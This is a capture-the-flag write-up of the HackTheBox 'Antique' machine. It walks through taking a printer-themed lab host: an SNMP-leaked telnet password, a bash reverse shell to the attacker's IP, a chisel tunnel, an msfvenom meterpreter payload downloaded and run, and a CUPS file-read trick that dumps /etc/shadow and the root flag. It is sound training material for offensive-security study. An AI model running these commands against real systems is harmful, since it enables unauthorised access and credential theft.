---
title: HackTheBox - Antique
published: true
---

## Summary

10.129.95.245

Antique starts by finding a listening telnet server that is password protected, and a snmp service that leaks a hex-encoded password for the telnet server. Once logged in to the telnet server we can execute os commands to get a reverse shell. Enumerating the box shows CUPS 1.6.1 is running on localhost port 631, we use chisel to expose the service to our attacker. With a bit of searching we find a metasploit post module for root file read and manage to recover the flag. 

## Initial Recon

We'll start with a quick Nmap TCP scan on all ports.

```bash
sudo nmap -v -p- -oN allports.nmap 10.129.95.245 --min-rate 10000

Nmap scan report for 10.129.95.245
Host is up (0.013s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE    SERVICE
23/tcp    open     telnet
```

![nmap_tcp](assets/antique_screenshots/nmap_tcp.png)

The TCP scan only found telnet on port 23, so I decided to run a UDP scan as well while I looked at telnet.

```bash
nmap -v -sU -p- -oN udp_allports.nmap --min-rate 10000 10.129.95.245

Nmap scan report for 10.129.95.245
Host is up (0.027s latency).
Not shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
```

![nmap_udp](assets/antique_screenshots/nmap_udp.png)

The UDP scan found snmp open, let's run snmpwalk.

```bash
snmpwalk -v 1 -c public 10.129.95.245 1

SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
SNMPv2-SMI::enterprises.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

Let's look in to telnet.

```bash
telnet 10.129.95.245 23

Trying 10.129.95.245...
Connected to 10.129.95.245.
Escape character is '^]'.

HP JetDirect


Password:
Invalid password
Connection closed by foreign host.
```

The usual default passwords of "admin" don't work, so let's google `HP JetDirect password`

![google_for_password](assets/antique_screenshots/google_for_password.png)

The top result takes us to [Iron Geek - Hacking Network Printers])(<http://www.irongeek.com/i.php?page=security/networkprinterhacking>). After skimming the page we see a section on getting the password from SNMP.

![irongeek_printer_password](assets/antique_screenshots/irongeek_printer_password.png)

Using an [online hex decoder](https://www.rapidtables.com/convert/number/hex-to-ascii.html) to decode the hex string we found with snmpwalk gets us a password of `P@ssw0rd@123!!123`

![hex_decoder](assets/antique_screenshots/hex_decoder.png)

Let's try using the password to log in to the telnet server.

```bash
telnet 10.129.95.245 23
Trying 10.129.95.245...
Connected to 10.129.95.245.
Escape character is '^]'.

HP JetDirect


Password: P@ssw0rd@123!!123

Please type "?" for HELP
>
```

We get logged in and can send `?` to list commands.

![telnet_login](assets/antique_screenshots/telnet_login.png)

The `exec` command looks good, let's try and get a reverse shell.

We'll set up a netcat listener on our attacker.

```bash
nc -lvnp 9001
```

Then in the telnet session, we'll use `exec` to call a bash reverse shell

```bash
> exec /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.54/9001 0>&1"
```

And we catch the reverse shell on our netcat listener. The box has python3, so we can use the python pty trick to upgrade our shell.

```bash
Connection from 10.129.95.245:48196
bash: cannot set terminal process group (859): Inappropriate ioctl for device
bash: no job control in this shell
lp@antique:~$
lp@antique:~$ which python
which python
lp@antique:~$ which python3
which python3
/usr/bin/python3
lp@antique:~$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
lp@antique:~$ ^Z
[1]  + 20817 suspended  nc -lvnp 9001
tuz@hackbox [148] % stty raw -echo; fg
[1]  + 20817 continued  nc -lvnp 9001

lp@antique:~$ export TERM=xterm
lp@antique:~$
```

![user_proof](assets/antique_screenshots/user_proof.png)

## PrivEsc

Running netstat show's the box is listening on localhost port 631.

```bash
netstat -antop

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      867/python3          off (0.00/0/0)
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      2 10.129.183.238:48326    10.10.14.54:9001        ESTABLISHED 1817/bash            on (0.20/0/0)
tcp        0      0 127.0.0.1:33868         127.0.0.1:631           TIME_WAIT   -                    timewait (24.70/0/0)
tcp       25      0 10.129.183.238:23       10.10.14.54:60892       CLOSE_WAIT  867/python3          off (0.00/0/0)
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                    off (0.00/0/0)
```

Connecting to the port with curl shows a CUPS page.

```html
curl http://localhost:631

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
 <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
 <TITLE>Home - CUPS 1.6.1</TITLE>
 <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
 <LINK REL="SHORTCUT ICON" HREF="/images/cups-icon.png" TYPE="image/png">
</HEAD>
<BODY>
<TABLE CLASS="page" SUMMARY="{title}">
<TR><TD CLASS="body">
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0" SUMMARY="">
<TR HEIGHT="36">
<TD><A HREF="http://www.cups.org/" TARGET="_blank"><IMG
SRC="/images/left.gif" WIDTH="64" HEIGHT="36" BORDER="0" ALT=""></A></TD>
<TD CLASS="sel"><A HREF="/">&nbsp;&nbsp;Home&nbsp;&nbsp;</A></TD>
<TD CLASS="unsel"><A HREF="/admin">&nbsp;&nbsp;Administration&nbsp;&nbsp;</A></TD>
<TD CLASS="unsel"><A HREF="/classes/">&nbsp;&nbsp;Classes&nbsp;&nbsp;</A></TD>
<TD CLASS="unsel"><A HREF="/help/">&nbsp;&nbsp;Online&nbsp;Help&nbsp;&nbsp;</A></TD>
<TD CLASS="unsel"><A HREF="/jobs/">&nbsp;&nbsp;Jobs&nbsp;&nbsp;</A></TD>
<TD CLASS="unsel"><A HREF="/printers/">&nbsp;&nbsp;Printers&nbsp;&nbsp;</A></TD>
<TD CLASS="unsel" WIDTH="100%"><FORM ACTION="/help/" METHOD="GET"><INPUT
TYPE="SEARCH" NAME="QUERY" SIZE="20" PLACEHOLDER="Search Help"
AUTOSAVE="org.cups.help" RESULTS="20"></FORM></TD>
<TD><IMG SRC="/images/right.gif" WIDTH="4" HEIGHT="36" ALT=""></TD>
</TR>
</TABLE>

<TABLE CLASS="indent" SUMMARY="">
<TR><TD STYLE="padding-right: 20px;">

<H1>CUPS 1.6.1</H1>

<P>CUPS is the standards-based, open source printing system developed by
<A HREF="http://www.apple.com/">Apple Inc.</A> for OS<SUP>&reg;</SUP> X and
other UNIX<SUP>&reg;</SUP>-like operating systems.</P>

</TD>
<TD><A HREF="http://www.cups.org/"><IMG SRC="images/cups-icon.png" WIDTH="128"
HEIGHT="128" ALT="CUPS"></A></TD>
</TR>
</TABLE>

<TABLE CLASS="indent" SUMMARY="">
<TR><TD VALIGN="top" STYLE="border-right: dotted thin #cccccc; padding-right: 20px;">

<H2>CUPS for Users</H2>

<P><A HREF="help/overview.html">Overview of CUPS</A></P>

<P><A HREF="help/options.html">Command-Line Printing and Options</A></P>

<P><A HREF="help/whatsnew.html">What's New in CUPS 1.6</A></P>

<P><A HREF="http://www.cups.org/newsgroups.php?gcups.general">User Forum</A></P>

</TD><TD VALIGN="top" STYLE="border-right: dotted thin #cccccc; padding-left: 20px; padding-right: 20px;">

<H2>CUPS for Administrators</H2>

<P><A HREF="admin">Adding Printers and Classes</A></P>

<P><A HREF="help/policies.html">Managing Operation Policies</A></P>

<P><A HREF="help/accounting.html">Printer Accounting Basics</A></P>

<P><A HREF="help/security.html">Server Security</A></P>

<P><A HREF="help/kerberos.html">Using Kerberos Authentication</A></P>

<P><A HREF="help/network.html">Using Network Printers</A></P>

<P><A HREF="help/ref-cupsd-conf.html">cupsd.conf Reference</A></P>

<P><A HREF="http://www.cups.org/ppd.php">Find Printer Drivers</A></P>

</TD><TD VALIGN="top" STYLE="padding-left: 20px;">

<H2>CUPS for Developers</H2>

<P><A HREF="help/api-overview.html">Introduction to CUPS Programming</A></P>

<P><A HREF="help/api-cups.html">CUPS API</A></P>

<P><A HREF="help/api-filter.html">Filter and Backend Programming</A></P>

<P><A HREF="help/api-httpipp.html">HTTP and IPP APIs</A></P>

<P><A HREF="help/api-ppd.html">PPD API</A></P>

<P><A HREF="help/api-raster.html">Raster API</A></P>

<P><A HREF="help/ref-ppdcfile.html">PPD Compiler Driver Information File Reference</A></P>

<P><A HREF="http://www.cups.org/newsgroups.php?gcups.development">Developer Forum</A></P>

</TD></TR>
</TABLE>

</TD></TR>
<TR><TD>&nbsp;</TD></TR>
<TR><TD CLASS="trailer">CUPS and the CUPS logo are trademarks of
<A HREF="http://www.apple.com">Apple Inc.</A> CUPS is copyright 2007-2012 Apple
Inc. All rights reserved.</TD></TR>
</TABLE>
</BODY>
</HTML>
```

Searching for `CUPS 1.6.1 exploits` brings up 2 interesting possiblitys. [CUPS 1.6.1 Root File Read](https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/) is an arbitarry root file read, [CUPS < 2.0.3 - Remote Command Execution](https://www.exploit-db.com/exploits/41233) is a RCE and requires a printer to be added in CUPS.

We can use [chisel](https://github.com/jpillora/chisel) to [reverse port forward](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html) the CUPS service on the victims port 631 to our attackers local port.
First we need to download [chisel linux amd64](https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz) to our attacker box.
Extract the archive, then host the file on our attacker.

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz && gunzip -d chisel_1.7.6_linux_amd64.gz && python3 -m http.server
```

Then upload chisel to the victim, then chmod it as executable.

```bash
wget -O chisel http://10.10.14.54:8080/chisel_1.7.6_linux_amd64 && chmod +x ./chisel
```

Now we run chisel as a reverse tunnelling enabled server on our attacker.

```bash
./chisel_1.7.6_linux_amd64 server -p 8081 --reverse &
```

And then run chisel as a client on our victim.

```bash
./chisel client 10.10.14.54:8081 R:63131:127.0.0.1:631
```

We can now connect to the CUPS web service on our attacker box, on port 63131

![cups_localhost](assets/antique_screenshots/cups_localhost.png)

The RCE requires a printer be set up, and in this case there is no printer. No win there.

![cups_no_printer](assets/antique_screenshots/cups_no_printer.png)

[CUPS 1.6.1 Root File Read](https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/).
We can exploit this manualy or with a meterpreter shell.

### Manual CUPS root file read

The manual method is worth highlighting, as more offten than not we can manualy carry out the same exploit as metasploit, sometimes with a bit of python scripting. This is usefull for situations where meterpreter is unavalible, or in the OSCP exam where its use is limited.

Reading the source for the metasploit module shows how to exploit the service manualy.

First we ensure our victim is in the lpadmin group.

![user_id](assets/antique_screenshots/user_id.png)

Then we use the `cupsctl` utility to set the file we want to read.

```bash
cupsctl ErrorLog=/etc/shadow
```

Now we navigate to the `error_log` and we get the file.

![error_log](assets/antique_screenshots/error_log.png)

### Metasploit root file read

The benifit of the metasploit route is not having to tunnel the CUPS service, as the module runs in the current meterpreter session.

Create the meterpreter shell with msfvenom.

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.54 LPORT=4444 -f elf > met
```

Locally host then upload the meterpreter payload to the victim.

```bash
sudo python -m http.server 80
```

```bash
wget http://10.10.14.54/met
```

Start a metasploit multihandler.

```bash
msfconsole -q -x "use exploit/multi/handler; set paylaod linux/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; run -j"
```

Run the meterpreter payload on the victim.

```bash
chmod +x met; ./met &
```

We get a meterpreter session. Now we can use the CUPS root file read post module.

```bash
use post/multi/escalate/cups_root_file_read; set session 1; run
```

![cups_root_file_read](assets/antique_screenshots/cups_root_file_read.png)

![root_hash](assets/antique_screenshots/root_hash.png)

This gets us the /etc/shadow file. We can also change the FILE variable to /root/root.txt to get the flag.

![root_flag](assets/antique_screenshots/root_flag.png)

We can try and crack the root password to then su as root, but that's all we can do as there's no ssh server running to steal keys for and we don't have the ability to write as root.

![hashcat_fail](assets/antique_screenshots/hashcat_fail.png)
